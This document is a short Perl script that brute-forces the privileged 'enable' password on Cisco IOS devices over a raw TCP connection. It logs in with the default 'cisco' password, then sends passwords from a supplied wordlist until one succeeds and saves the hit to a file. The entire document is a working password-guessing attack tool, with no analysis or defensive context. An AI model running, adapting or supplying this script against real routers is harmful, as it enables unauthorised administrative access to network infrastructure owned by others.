#!/usr/bin/perl
#
# VERY lame enable brute by madcr on IOS. ios ios ... my dear ios ;)
#
#
use Socket;


$remote="$ARGV[0]";    # ip.
$port="$ARGV[1]";      # port.
$passlist="$ARGV[2]";  # password list.

open (fl,$passlist) || die "open() $! $@";
$flbuff = <fl>;

$iaddr = inet_aton($remote);
$paddr = sockaddr_in($port, $iaddr);

discon:
socket (SOCK, PF_INET, SOCK_STREAM, 'tcp') || die "socket() $! $@";
connect (SOCK, $paddr) || die "not connect() $! $@";

send SOCK,"cisco\x0a\x0d",0;


agayn:

     recv SOCK,$ret,50,0;     # Maximum lenght answer.

            if ($ret =~ '>')
                   {
                   send SOCK,"\x0d",0;         # IOS have one charecter
                   send SOCK,"enable\x0d",0;   # cariage return 0dh !
                   }
            else
                   {
                   goto agayn;
                   }

more:
{
     print "send $flbuff";
     open (wr,">lasttry") || die "open() $! $@";
     $wrbuff = <wr>;
     print wr $flbuff;
     close (wr);
     send SOCK,$flbuff,0;       # Send password from list.
     sleep (3);
     recv SOCK,$ret2,100,0;     # Maximum lenght answer.

            if ($ret2 =~ 'word: ')
                   {
                   $flbuff = <fl>;
                   goto more;
                   }
            elsif ($ret2 =~ '>')
                   {
                   print "reconnect","\n";
                   $flbuff = <fl>;
                   send SOCK,"enable\x0d",0;
                   goto more;
                   }
            else
                   {
                   print "YES! Find passworD!","\n";
                   open (good,">find!!!");
                   print good $flbuff;
                   close (good);
                   close (SOCK);
                   exit;
                   }
}